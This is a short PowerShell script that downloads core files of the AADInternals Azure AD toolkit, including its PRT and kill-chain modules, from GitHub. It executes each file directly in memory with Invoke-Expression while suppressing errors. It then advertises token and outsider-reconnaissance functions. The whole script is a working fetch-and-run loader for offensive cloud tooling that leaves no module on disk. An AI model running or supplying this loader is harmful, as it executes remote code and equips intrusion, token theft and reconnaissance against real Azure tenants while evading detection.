# Minimal AADInternals Loader - Clean Version
# Downloads and loads core AADInternals functions into memory

$ErrorActionPreference = "SilentlyContinue"
$baseUrl = "https://raw.githubusercontent.com/Gerenios/AADInternals/master/"

# Core files to load (essential functions only)
$coreFiles = @(
    "CommonUtils.ps1",
    "AccessToken.ps1", 
    "AccessToken_utils.ps1",
    "GraphAPI.ps1",
    "MSGraphAPI.ps1",
    "AzureManagementAPI.ps1",
    "PRT.ps1",
    "KillChain.ps1"
)

Write-Host "=== AADInternals Memory Loader ===" -ForegroundColor Yellow
Write-Host "Loading core functions into memory..." -ForegroundColor White

# Load required assemblies
Add-Type -AssemblyName System.Xml.Linq -ErrorAction SilentlyContinue
Add-Type -AssemblyName System.Runtime.Serialization -ErrorAction SilentlyContinue  
Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue
Add-Type -AssemblyName System.Web.Extensions -ErrorAction SilentlyContinue

# Set TLS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$loaded = 0
$failed = 0

foreach ($file in $coreFiles) {
    Write-Host "Loading $file..." -NoNewline
    
    $url = $baseUrl + $file
    $content = (New-Object Net.WebClient).DownloadString($url)
    
    if ($content) {
        # Fix PSScriptRoot references
        $content = $content -replace '\$PSScriptRoot', '""'
        
        # Load the script
        Invoke-Expression $content
        Write-Host " ✓" -ForegroundColor Green
        $loaded++
    } else {
        Write-Host " ✗" -ForegroundColor Red  
        $failed++
    }
    
    Start-Sleep -Milliseconds 200
}

# Set module info
$script:AADInternalsVersion = "0.9.8"
$script:AADInternalsLoaded = $true

Write-Host "`nLoading complete!" -ForegroundColor Cyan
Write-Host "Loaded: $loaded files" -ForegroundColor Green
Write-Host "Failed: $failed files" -ForegroundColor Red

Write-Host "`nAADInternals core functions are now available:" -ForegroundColor White
Write-Host "  Get-AADIntAccessTokenForAADGraph" -ForegroundColor Gray
Write-Host "  Get-AADIntTenants" -ForegroundColor Gray  
Write-Host "  Get-AADIntLoginInformation" -ForegroundColor Gray
Write-Host "  Invoke-AADIntReconAsOutsider" -ForegroundColor Gray
